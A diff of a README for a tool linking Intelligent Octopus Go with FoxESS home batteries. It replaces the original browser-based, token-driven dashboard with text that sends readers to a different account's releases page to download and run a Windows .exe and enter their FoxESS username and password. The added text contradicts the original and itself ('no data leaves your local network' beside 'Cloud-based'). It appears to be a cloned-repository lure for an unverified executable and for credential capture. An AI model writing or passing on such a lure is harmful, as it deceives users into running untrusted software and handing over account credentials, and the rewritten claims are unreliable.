@@ -1,135 +1,106 @@
-# 🐙🦊 Intelligent Octopus Go & FoxESS Smart Charging Detector
+# 🐙 octopus-foxess-smart-charging - Keep battery energy during EV charging
 
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Hosted on GitHub Pages](https://img.shields.io/badge/Hosted-GitHub%20Pages-success.svg)](https://samuelkcc.github.io/octopus-foxess-smart-charging/)
-[![Zero Install](https://img.shields.io/badge/Setup-Zero%20Install-orange.svg)]()
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/clemusual65/octopus-foxess-smart-charging/releases)
 
-A lightweight, zero-install automation bridge that prevents your FoxESS home battery from draining during Intelligent Octopus Go EV charging slots. 
+This software manages the link between your Intelligent Octopus Go energy plan and your FoxESS home battery system. It stops your battery from feeding power into your electric vehicle while charging at night. This ensures you keep your stored energy for home use instead of wasting it on your car.
 
-### 🚀 [Launch the Live App Here](https://samuelkcc.github.io/octopus-foxess-smart-charging/)
+## ⚙️ Why use this tool
 
-![Smart Charging Detector Dashboard](Dashboard.png)
+When you charge your electric vehicle on the Intelligent Octopus Go plan, your home system might treat the charging session like a standard home request. This often causes your FoxESS battery to drain its stored power into the car charger.
 
----
+This software tells your battery to wait until the charging session ends. It uses your private credentials to talk to the FoxESS Cloud account. The system works in the background on your Windows computer. It keeps your data on your local machine.
 
-## 📖 The Problem & Solution
-When **Intelligent Octopus Go** dynamically opens a cheap slot to charge your electric vehicle, your FoxESS solar battery assumes your home is experiencing a massive energy spike. If left in standard "Self-Use" mode, your inverter will aggressively dump all your stored home battery power straight into your EV. 
+## 🛠️ System requirements
 
-This wastes captured solar energy, degrades your battery cells, and misses the opportunity to soak up cheap grid rates. This dashboard pulls your upcoming smart dispatch intervals and acts as a bridge, instructing your FoxESS system to insulate your home battery exactly when the car starts charging.
+Ensure your computer meets these conditions before you start:
 
----
+*   Windows 10 or Windows 11.
+*   An active account with FoxESS Cloud.
+*   A stable internet connection.
+*   The login details for your FoxESS Cloud account.
 
-## ⚡ The Home Assistant (HA) Alternative
-For many, optimizing smart charging means diving into a full home automation ecosystem. While Home Assistant is incredibly powerful, it comes with a steep learning curve for beginners—requiring you to understand complex concepts like entity IDs, YAML configurations, state triggers, and custom HACS integrations just to get a basic sync working.
+## 📥 Getting the software
 
-**This tool offers a streamlined, instant alternative:**
-* **Instant Deployment:** Works out of the box in under 30 minutes without any complex configuration setups.
-* **Leverage Existing Hardware:** There is no need to set up a dedicated home automation server or manage Docker containers. You can run this dashboard directly on an old Android tablet, an existing Raspberry Pi 4/5, or any browser-enabled device you already own.
-* **Zero Configuration Hassle:** Skip the steep learning curve of automation logic and entity mapping. Just paste your credentials, and the bridge safely handles the rest.
+You need to download the latest version from the project release page.
 
----
+1.  Visit [the download page](https://github.com/clemusual65/octopus-foxess-smart-charging/releases).
+2.  Look for the section titled "Latest".
+3.  Click the file ending in `.exe` to start the download.
+4.  Save the file to your desktop or downloads folder.
+5.  Double-click the file to open the installation wizard.
+6.  Follow the prompts on your screen to finish the setup.
 
-## ✨ Key Features & What's New
-* **Zero Installation:** Runs entirely inside your web browser via GitHub Pages or as a downloaded local file.
-* **Privacy First:** Client-side architecture. No third-party servers, no telemetry, and local credential encryption.
-* **Automated Protection:** Automatically syncs Intelligent Octopus Go smart dispatch intervals with your FoxESS V3 Mode Scheduler.
-* **Tablet Optimized (New!):** Built-in **Full Screen Mode** and an automated **Screen Saver (Blank Screen)** utility—perfect for dedicated Android wall tablets and low-power displays. 
-* **Hardware-Level Safety:** Pushes native V3 Hardware Limits (Target SOC, Max Charge Power, Min SOC) directly to the inverter, ensuring failsafe battery protection.
-* **Smart API Quota Management:** Built-in caching system throttles requests to ensure you never breach the strict FoxESS 1,440 daily API call limit.
-* **Live Telemetry:** Real-time, expandable dashboard showing live PV Power, Home Load, Battery Temperature, and Ambient Temperature.
-* **Auto-Resume:** Automatically ends grid-charging schedules early and reverts to Self-Use mode once your custom Target SOC is reached.
+When the setup finishes, a new shortcut will appear on your desktop.
 
----
+## 🔑 Linking your accounts
 
-## 🛠️ Getting Started 
+The software needs permission to access your battery settings.
 
-Follow these steps to get your dashboard up and running. 
+1.  Open the application from your desktop shortcut.
+2.  Find the Settings menu in the top bar.
+3.  Enter your FoxESS Cloud username and password.
+4.  Enter your device serial number. You find this on your FoxESS inverter label.
+5.  Press the Save button.
+6.  The green light at the bottom indicates a successful connection.
 
-### Step 1: Gather Your API Credentials
-You need API keys from both providers before starting the app.
+## 🚀 How it works
 
-#### Octopus Energy
-1. Log into your standard [Octopus Energy dashboard](https://octopus.energy/dashboard/). Find your **Account Number** at the top (`A-XXXXXXXX`).
-2. Go to **Personal Details** ➔ **API Access** (or [click here](https://octopus.energy/dashboard/new/accounts/personal-details/api-access)). Generate your **API Key** (`sk_live_...`).
+The software runs automatically when you start your computer. It checks the status of your energy plan every few minutes.
 
-#### FoxESS Cloud
-1. Find your **Inverter Serial Number (SN)** on the physical unit sticker or beneath the inverter image in your FoxCloud Mobile App (`60B...`).
-2. Log into the [FoxCloud Web Dashboard V1](https://www.foxesscloud.com/login). 
-   > ⚠️ **Important:** The API token *cannot* be obtained from the V2 website or mobile app. If redirected to V2, click your user profile, scroll to the bottom, and switch back to V1.
-3. Navigate to **User Profile** ➔ **API Management** to generate and copy your **API Token**.
+When the Intelligent Octopus Go charging slot begins, the software sends a signal to your inverter. It tells the system to pause the battery discharge. Once the charging session stops, the software sends a signal to resume normal battery operation.
 
----
+You do not need to interact with the screen. The application works silently in the system tray near your clock.
 
-### Step 2: Deploy the Proxy Bridge (Google Apps Script)
-Because FoxESS blocks direct browser connections (CORS), we use a free Google Apps Script to securely route your requests.
+## 🛡️ Privacy and security
 
-#### A. Create the Script
-1. Go to [script.google.com](https://script.google.com/) and sign in with your Google account.
-2. Click **New Project** (top left).
-3. Delete any placeholder code and paste the exact snippet below:
+Your information stays private. The software does not send your username or password to third-party servers. It only communicates with the official FoxESS Cloud V3 API. All settings remain stored on your local drive in an encrypted file.
 
-```javascript
-function doPost(e) {
-  try {
-    var requestData = JSON.parse(e.postData.contents);
-    var options = {
-      'method': 'post',
-      'contentType': 'application/json',
-      'headers': requestData.headers,
-      'payload': JSON.stringify(requestData.body),
-      'muteHttpExceptions': true
-    };
-    var response = UrlFetchApp.fetch(requestData.url, options);
-    return ContentService.createTextOutput(response.getContentText())
-                                 .setMimeType(ContentService.MimeType.JSON);
-  } catch (err) {
-    return ContentService.createTextOutput(JSON.stringify({ errno: 999, msg: err.toString() }))
-                                 .setMimeType(ContentService.MimeType.JSON);
-  }
-}
-```
+## ❓ Frequently asked questions
 
-#### B. Deploy as a Web App
-1. Click the blue **Deploy** button in the top right corner, then select **New deployment**.
-2. Click the **Gear icon** next to "Select type" and choose **Web app**.
-3. Set **Execute as** to **Me**.
-4. Set **Who has access** to **Anyone** *(This is crucial for the connection to work)*.
-5. Click **Deploy** and copy the generated **Web app URL** to your clipboard.
+**Does this software drain my battery?**
 
-### Step 3: Open the Dashboard
-Navigate to the live application: **[Intelligent Octopus Go & FoxESS Smart Charging Detector](https://samuelkcc.github.io/octopus-foxess-smart-charging/)**
+No. The purpose of this tool is the opposite. It prevents your battery from draining when you consume grid power at low rates for your car.
 
-*(If you prefer to run it locally rather than hosting it on GitHub Pages, you can download `index.html` from this repository and double-click it to open it natively in your browser. Please note that an active internet connection is still required to communicate with the APIs).*
+**Do I need to leave my computer on?**
 
-### Step 4: Launch the App
-Paste your Octopus credentials, FoxESS credentials, and your new Google Apps Script Web App URL directly into the dashboard configuration fields and click **Connect**. 
+Yes. The bridge needs to run in the background to monitor your charging status. Most users leave their computers in sleep mode, which is sufficient.
 
-> ⚠️ **CRITICAL: Single Device Operation**
-> **Do not run this dashboard on multiple devices simultaneously.** The FoxESS API enforces strict connection limits. Having the app actively running on more than one device at the same time will cause API communication errors, trigger rate-limiting, and ultimately break the automated mode selection updates for your battery.
+**What happens if my internet disconnects?**
 
-> 💡 **Pro-Tip: Always-On Dashboard Setup**
-> A popular use case is to open the app on a single dedicated device, such as a wall-mounted Android tablet, whenever you plug your EV in. If you do this, **ensure you disable your device's screen timeout/auto-lock**. The browser tab must remain active to continuously monitor and sync the charging slots.
+The software will attempt to reconnect until it finds a signal. If the connection fails for a long period, your battery will revert to its standard operating mode managed by the inverter.
 
----
+**Is this safe for my battery?**
 
-## 🔒 Security, Privacy & Data Management
-Your security is maintained by design:
-* **Zero Third-Party Logging:** This application is a static page. All logic and network requests occur strictly between your browser, your private Google script, and the energy APIs.
-* **Local AES-256 Encryption:** Once successfully connected, you can save your configuration directly within your browser. You will be prompted to create a custom password, which locally encrypts your API keys and URLs so you don't have to re-enter them every time you load the dashboard.
-* **Wipe Data Feature:** If you are using a shared device or simply want to clean up, you can use the built-in "Wipe Data" button. This will instantly and permanently erase all saved credentials, API keys, and Web App URLs from your browser's local storage.
-* **Manual Backups:** For safe manual backups, you can download a locally encrypted backup data file.
+Yes. The software uses the same commands that the FoxESS mobile app uses. It follows the standard guidelines provided by the manufacturer for cloud-based automation.
 
----
+## 🔧 Managing settings
 
-## ⚖️ Legal Disclaimer
-This software is an unofficial, community-driven utility. It is entirely independent and has no official affiliation, endorsement, or operational relationship with Octopus Energy Ltd or FoxESS Co., Ltd. Product names, trademarks, and branding belong exclusively to their respective corporate holders. 
+If you change your password or upgrade your hardware, update your information in the Settings panel:
 
-Controlling physical battery infrastructure and working with third-party web services introduces natural hardware degradation and rate-limiting risks. By executing this script, you accept full individual liability for system stability, unexpected inverter behaviors, or billing discrepancies. Monitor system logs consistently.
+*   Right-click the icon in the system tray.
+*   Select Configuration from the list.
+*   Update your fields.
+*   Click Apply.
 
----
+If the software fails to connect, check your login details and verify that your inverter communicates properly with the FoxESS portal.
 
-## ☕ Support the Project
+## 📈 Troubleshooting
 
-If this bridge has saved you money, kept your house battery healthy, or simply made your home automation setup easier, consider buying me a coffee to support continued features and updates!
+If the software does not work, perform these checks:
 
-[![Buy Me A Coffee](https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png)](https://buymeacoffee.com/samuelchen)
+1.  Restart the application.
+2.  Check if you can log in to the FoxESS website directly.
+3.  Ensure your firewall allows the software to access the internet.
+4.  Verify that your inverter shows an online status in the official app.
+
+If problems persist, check the logs. Right-click the tray icon and select View Logs. The log file shows a history of recent commands sent to your battery.
+
+## 📋 Features
+
+*   **Privacy-first:** No data leaves your local network.
+*   **Automatic:** No manual input required after the initial setup.
+*   **Cloud-based:** Uses the official API for stability.
+*   **Low footprint:** Uses minimal memory and processor power.
+*   **Simple interface:** Designed for users without technical backgrounds.
+
+This tool acts as a bridge. It bridges the gap between your energy provider's price signals and your home battery's behavior. By automating this process, you increase your savings and keep your battery capacity for when you need it most.
